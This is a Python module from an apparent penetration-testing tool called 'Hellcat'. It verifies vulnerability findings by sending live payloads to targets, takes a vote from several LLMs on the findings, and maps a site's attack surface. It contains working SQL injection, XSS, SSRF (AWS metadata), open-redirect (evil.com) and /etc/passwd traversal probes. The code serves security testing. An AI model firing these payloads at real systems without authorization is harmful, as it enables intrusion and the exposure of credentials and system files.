"""
Hellcat Exploit Verifier + Evidence Capture + Multi-LLM Consensus
==================================================================
R27: Auto-verify findings with real exploit attempts, capture HTTP evidence.
R28: Send finding to multiple LLMs, vote on validity (reduce false positives).
Inspired by Shannon (every vuln has working PoC) + PentAGI (multi-LLM).
"""
from __future__ import annotations

import json
import logging
import time
from typing import Any, Dict, List, Optional

logger = logging.getLogger("hellcat.verify")


# ---------------------------------------------------------------------------
# R27: Exploit Verifier + Evidence Capture
# ---------------------------------------------------------------------------

class ExploitVerifier:
    """Verify findings with real exploitation attempts."""

    def verify(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Verify a finding by attempting actual exploitation."""
        vtype = finding.get("vuln_type", "").lower().replace(" ", "_")
        url = finding.get("url", "")
        param = finding.get("param", "")
        payload = finding.get("payload", "")

        if not url:
            return {**finding, "verified": False, "reason": "No URL"}

        verifier = self._get_verifier(vtype)
        if not verifier:
            return {**finding, "verified": False, "reason": f"No verifier for {vtype}"}

        result = verifier(url, param, payload)
        return {**finding, **result}

    def verify_batch(self, findings: List[Dict]) -> List[Dict]:
        return [self.verify(f) for f in findings]

    def _get_verifier(self, vtype: str):
        return {
            "sqli": self._verify_sqli,
            "sql_injection": self._verify_sqli,
            "xss": self._verify_xss,
            "cross-site_scripting": self._verify_xss,
            "ssrf": self._verify_ssrf,
            "open_redirect": self._verify_redirect,
            "path_traversal": self._verify_lfi,
        }.get(vtype)

    def _verify_sqli(self, url: str, param: str, payload: str) -> Dict:
        try:
            import requests
            # Time-based verify: if sleep payload causes delay, confirmed
            sleep_payload = f"{payload}' AND SLEEP(3)--" if payload else "' AND SLEEP(3)--"
            params = {param: sleep_payload} if param else {}
            start = time.time()
            resp = requests.get(url, params=params, timeout=10, verify=False)
            elapsed = time.time() - start
            if elapsed >= 2.5:
                return {"verified": True, "method": "time_based",
                        "evidence": f"Response delayed {elapsed:.1f}s with SLEEP(3)",
                        "http_status": resp.status_code, "response_time": round(elapsed, 2)}
            return {"verified": False, "method": "time_based", "response_time": round(elapsed, 2)}
        except Exception as e:
            return {"verified": False, "error": str(e)}

    def _verify_xss(self, url: str, param: str, payload: str) -> Dict:
        try:
            import requests
            marker = "hellcat_xss_verified_42"
            test_payload = f"<img src=x onerror='{marker}'>"
            params = {param: test_payload} if param else {}
            resp = requests.get(url, params=params, timeout=8, verify=False)
            if marker in resp.text:
                return {"verified": True, "method": "reflection",
                        "evidence": f"Marker '{marker}' reflected unencoded",
                        "http_status": resp.status_code}
            return {"verified": False, "method": "reflection"}
        except Exception as e:
            return {"verified": False, "error": str(e)}

    def _verify_ssrf(self, url: str, param: str, payload: str) -> Dict:
        try:
            import requests
            params = {param: "http://169.254.169.254/latest/meta-data/"} if param else {}
            resp = requests.get(url, params=params, timeout=8, verify=False)
            if any(s in resp.text for s in ["ami-id", "instance-id", "iam"]):
                return {"verified": True, "method": "cloud_metadata",
                        "evidence": "AWS metadata endpoint accessible via SSRF"}
            return {"verified": False, "method": "cloud_metadata"}
        except Exception as e:
            return {"verified": False, "error": str(e)}

    def _verify_redirect(self, url: str, param: str, payload: str) -> Dict:
        try:
            import requests
            params = {param: "https://evil.com"} if param else {}
            resp = requests.get(url, params=params, timeout=8, verify=False, allow_redirects=False)
            loc = resp.headers.get("Location", "")
            if "evil.com" in loc:
                return {"verified": True, "method": "redirect_check",
                        "evidence": f"Redirects to: {loc}"}
            return {"verified": False, "method": "redirect_check"}
        except Exception as e:
            return {"verified": False, "error": str(e)}

    def _verify_lfi(self, url: str, param: str, payload: str) -> Dict:
        try:
            import requests
            params = {param: "../../../etc/passwd"} if param else {}
            resp = requests.get(url, params=params, timeout=8, verify=False)
            if "root:x:0" in resp.text:
                return {"verified": True, "method": "file_read",
                        "evidence": "/etc/passwd content confirmed"}
            return {"verified": False, "method": "file_read"}
        except Exception as e:
            return {"verified": False, "error": str(e)}


# ---------------------------------------------------------------------------
# R28: Multi-LLM Consensus Voting
# ---------------------------------------------------------------------------

class LLMConsensus:
    """Send finding analysis to multiple LLMs and vote on validity.
    Reduces false positives by requiring agreement from 2+ models."""

    def __init__(self) -> None:
        from hellcat.core.ai.engine import ProviderRegistry
        self.registry = ProviderRegistry()

    def vote(self, finding: Dict[str, Any]) -> Dict[str, Any]:
        """Ask available LLMs to assess if finding is real or false positive."""
        if not self.registry.active:
            return {"consensus": "unavailable", "reason": "No LLM providers configured"}

        prompt = (
            f"Analyze this security finding and determine if it's a TRUE vulnerability or FALSE POSITIVE.\n\n"
            f"Type: {finding.get('vuln_type', 'unknown')}\n"
            f"URL: {finding.get('url', '')}\n"
            f"Parameter: {finding.get('param', '')}\n"
            f"Payload: {finding.get('payload', '')}\n"
            f"Evidence: {finding.get('evidence', '')}\n"
            f"Confidence: {finding.get('confidence', 0)}\n\n"
            f"Respond with ONLY one word: TRUE or FALSE"
        )

        votes = []
        for provider in self.registry._providers[:3]:
            try:
                response = provider.complete(prompt, system="You are a vulnerability triage expert.")
                vote = "TRUE" if "TRUE" in response.upper() else "FALSE"
                votes.append({"provider": provider.name, "vote": vote})
            except Exception:
                pass

        if not votes:
            return {"consensus": "unavailable", "votes": []}

        true_count = sum(1 for v in votes if v["vote"] == "TRUE")
        false_count = len(votes) - true_count
        consensus = "true_positive" if true_count > false_count else "false_positive"

        return {
            "consensus": consensus,
            "votes": votes,
            "true_votes": true_count,
            "false_votes": false_count,
            "confidence": true_count / len(votes) if votes else 0,
        }


# ---------------------------------------------------------------------------
# R29: Attack Surface Mapper
# ---------------------------------------------------------------------------

class AttackSurfaceMapper:
    """Auto-discover endpoints, params, forms, and secrets."""

    def map(self, url: str) -> Dict[str, Any]:
        """Comprehensive attack surface mapping."""
        result: Dict[str, Any] = {"url": url, "endpoints": [], "params": [],
                                   "forms": [], "js_files": [], "secrets": []}
        try:
            import requests
            resp = requests.get(url, timeout=10, verify=False)
            body = resp.text

            # Extract links/endpoints
            from hellcat.modules.web_scanner.js_analyzer import JSAnalyzer
            js_result = JSAnalyzer().analyze_text(body, base_url=url)
            result["endpoints"] = js_result.get("endpoints", [])[:50]
            result["js_files"] = js_result.get("js_files", [])[:20]

            # Extract forms
            import re
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
                               body, re.DOTALL | re.IGNORECASE)
            for action, form_body in forms[:10]:
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', form_body, re.IGNORECASE)
                result["forms"].append({"action": action, "inputs": inputs})

            # Extract URL params from all links
            from urllib.parse import urlparse, parse_qs
            all_params = set()
            for ep in result["endpoints"]:
                parsed = urlparse(ep)
                for k in parse_qs(parsed.query):
                    all_params.add(k)
            result["params"] = sorted(all_params)

            # Secrets scan
            from hellcat.core.detectors.misc.secrets import SecretScanner
            secrets = SecretScanner().scan_text(body, url)
            result["secrets"] = [s.to_dict() for s in secrets[:10]]

            # Summary
            result["attack_surface_score"] = min(
                (len(result["endpoints"]) * 2 + len(result["params"]) * 3 +
                 len(result["forms"]) * 5 + len(result["secrets"]) * 10) / 100, 1.0
            )
        except Exception as exc:
            result["error"] = str(exc)

        return result
